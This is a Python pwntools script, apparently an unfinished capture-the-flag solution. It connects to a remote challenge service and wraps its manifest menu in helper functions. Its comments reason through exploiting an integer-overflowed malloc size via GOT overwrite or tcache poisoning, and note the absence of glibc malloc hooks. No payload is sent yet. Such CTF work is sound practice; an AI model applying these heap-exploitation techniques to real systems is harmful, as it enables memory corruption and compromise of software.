from pwn import *

p = remote("kubenode.mctf.io", 31098)

def recv_menu():
    return p.recvuntil(b'> ')

def register(idx, count, size, data):
    p.sendline(b'1')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Item count: ')
    p.sendline(str(count).encode())
    p.recvuntil(b'Item size (bytes): ')
    p.sendline(str(size).encode())
    if len(data) > 0:
        p.recvuntil(b'data:\n')
        p.send(data)
    recv_menu()

def view(idx):
    p.sendline(b'2')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    res = p.recvuntil(b'\n\n===', drop=True)
    recv_menu()
    return res

def inspect(idx):
    p.sendline(b'3')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'Validator    : ')
    validator = int(p.recvline().strip(), 16)
    p.recvuntil(b'Checkpoint   : ')
    checkpoint = int(p.recvline().strip(), 16)
    recv_menu()
    return validator, checkpoint

def delete(idx):
    p.sendline(b'4')
    p.recvuntil(b'Manifest ID (0-15): ')
    p.sendline(str(idx).encode())
    recv_menu()

recv_menu()

# 65544 is still too big.
# Is there a way to make `count * size` small, but `malloc` even smaller?
# `malloc` is `(count * size) & 0xffff`.
# To make it overflow, `(count * size) & 0xffff` must be < `count * size`.
# This implies `count * size >= 65536`. So it's always at least 65536 bytes!
# So we CANNOT read/write less than 65536 bytes using the overflow chunk!
# That means if we write to GOT, we overwrite 65536 bytes from GOT onwards.
# Since GOT is near the end of the data segment, reading/writing 65536 bytes WILL cause a segfault.
# Because the `.bss` ends at 0x3760, and 65536 bytes from GOT reaches unmapped memory.
# WAIT. The GOT is at 0x3600.
# The binary is loaded at `base_addr`.
# Usually, a PIE binary has a 4KB or 8KB data segment.
# Is it mapped with a large enough size? We can check `vmmap` or `readelf -l`.
# If it segfaults on write, we can't overwrite GOT.
# We must overwrite something on the HEAP!
# What is on the heap?
# The `Checkpoint` pointers point to the heap.
# Wait, `free` uses the chunk pointer. If we can overwrite a chunk's `fd` pointer to point to the `Checkpoint` array in `.bss`...
# The `.bss` array is at 0x3740. It is BEFORE unmapped memory.
# If we do tcache poisoning to allocate at 0x3740, we write there.
# Can we just overwrite `__free_hook` or `__malloc_hook`?
# GLIBC 2.34 REMOVED `__free_hook` and `__malloc_hook`!
# So we can't use hooks.

p.close()
